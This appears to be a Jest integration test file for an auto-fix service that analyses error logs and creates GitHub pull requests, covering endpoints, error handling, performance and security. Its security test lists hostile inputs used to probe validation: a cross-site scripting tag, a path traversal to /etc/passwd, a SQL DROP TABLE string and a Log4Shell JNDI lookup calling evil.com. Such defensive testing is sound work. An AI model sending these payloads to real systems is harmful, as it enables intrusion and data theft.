/**
 * Auto Fix System Integration Tests
 * Tests the complete auto-fix workflow from trigger to PR creation
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/test-utils'

describe('Auto Fix System Integration', () => {
  let testProjectId: string
  let testSessionId: string

  beforeEach(() => {
    testProjectId = `test-project-${Date.now()}`
    testSessionId = ''
  })

  afterEach(async () => {
    // Cleanup test data if needed
    if (testSessionId) {
      // Clean up test session
    }
  })

  describe('API Endpoints', () => {
    test('POST /api/github/auto-fix - should trigger auto-fix process', async () => {
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: testProjectId,
          logContent: 'TypeError: Cannot read property "test" of undefined at line 42',
          triggerType: 'manual'
        })
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.sessionId).toBeDefined()
      expect(data.message).toContain('Auto-fix process initiated')
      
      testSessionId = data.sessionId
    })

    test('GET /api/auto-fix/stats - should return statistics', async () => {
      const response = await fetch('/api/auto-fix/stats')
      
      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.stats).toBeDefined()
      expect(data.stats.totalSessions).toBeGreaterThanOrEqual(0)
      expect(data.stats.successRate).toBeGreaterThanOrEqual(0)
    })

    test('GET /api/auto-fix/sessions - should return sessions list', async () => {
      const response = await fetch('/api/auto-fix/sessions?limit=10')
      
      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.sessions).toBeInstanceOf(Array)
      expect(data.pagination).toBeDefined()
    })

    test('POST /api/auto-fix/stats - should update settings', async () => {
      const newSettings = {
        enableAutoFix: true,
        githubIntegration: true,
        branchPrefix: 'test-fix/',
        requireReview: false
      }

      const response = await fetch('/api/auto-fix/stats', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newSettings)
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.message).toContain('Settings updated')
      expect(data.settings).toMatchObject(newSettings)
    })
  })

  describe('GitHub Integration', () => {
    test('should authenticate with GitHub', async () => {
      const response = await fetch('/api/github/auto-fix', {
        method: 'GET'
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.authenticated).toBe(true)
    })
  })

  describe('Log Analysis', () => {
    test('should analyze error logs and suggest fixes', async () => {
      const testLogs = [
        'TypeError: Cannot read property "length" of undefined',
        'ReferenceError: variableName is not defined',
        'SyntaxError: Unexpected token "}"',
        'Error: ENOENT: no such file or directory'
      ]

      for (const log of testLogs) {
        const response = await fetch('/api/github/auto-fix', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            projectId: testProjectId,
            logContent: log,
            triggerType: 'test'
          })
        })

        expect(response.status).toBe(200)
        const data = await response.json()
        expect(data.sessionId).toBeDefined()
      }
    })
  })

  describe('Database Operations', () => {
    test('should create auto-fix session records', async () => {
      // Trigger auto-fix
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: testProjectId,
          logContent: 'Test error log',
          triggerType: 'test'
        })
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      testSessionId = data.sessionId

      // Verify session was created
      const sessionsResponse = await fetch(`/api/auto-fix/sessions?projectId=${testProjectId}`)
      expect(sessionsResponse.status).toBe(200)
      
      const sessionsData = await sessionsResponse.json()
      expect(sessionsData.sessions).toBeInstanceOf(Array)
      expect(sessionsData.sessions.length).toBeGreaterThan(0)
    })
  })

  describe('Error Handling', () => {
    test('should handle missing project ID', async () => {
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          logContent: 'Test error log',
          triggerType: 'test'
        })
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error).toContain('projectId')
    })

    test('should handle invalid trigger type', async () => {
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: testProjectId,
          logContent: 'Test error log',
          triggerType: 'invalid'
        })
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error).toContain('triggerType')
    })

    test('should handle malformed JSON', async () => {
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{ invalid json }'
      })

      expect(response.status).toBe(400)
    })
  })
})

// Performance Tests
describe('Auto Fix System Performance', () => {
  test('should handle concurrent requests', async () => {
    const concurrentRequests = 5
    const requests = Array(concurrentRequests).fill(null).map((_, i) => 
      fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: `concurrent-test-${i}`,
          logContent: `Test error ${i}`,
          triggerType: 'test'
        })
      })
    )

    const responses = await Promise.all(requests)
    
    for (const response of responses) {
      expect(response.status).toBe(200)
    }
  })

  test('should respond within acceptable time limits', async () => {
    const startTime = Date.now()
    
    const response = await fetch('/api/auto-fix/stats')
    
    const responseTime = Date.now() - startTime
    expect(response.status).toBe(200)
    expect(responseTime).toBeLessThan(5000) // 5 seconds max
  })
})

// Security Tests
describe('Auto Fix System Security', () => {
  test('should validate input parameters', async () => {
    const maliciousInputs = [
      '"><script>alert("xss")</script>',
      '../../../etc/passwd',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}'
    ]

    for (const maliciousInput of maliciousInputs) {
      const response = await fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: maliciousInput,
          logContent: maliciousInput,
          triggerType: 'manual'
        })
      })

      // Should either reject or sanitize the input
      expect([200, 400, 403]).toContain(response.status)
    }
  })

  test('should enforce rate limiting', async () => {
    // Make rapid requests to test rate limiting
    const rapidRequests = Array(20).fill(null).map(() =>
      fetch('/api/github/auto-fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projectId: 'rate-limit-test',
          logContent: 'Test error',
          triggerType: 'manual'
        })
      })
    )

    const responses = await Promise.all(rapidRequests)
    
    // Some requests should be rate limited
    const rateLimitedResponses = responses.filter(r => r.status === 429)
    expect(rateLimitedResponses.length).toBeGreaterThan(0)
  })
})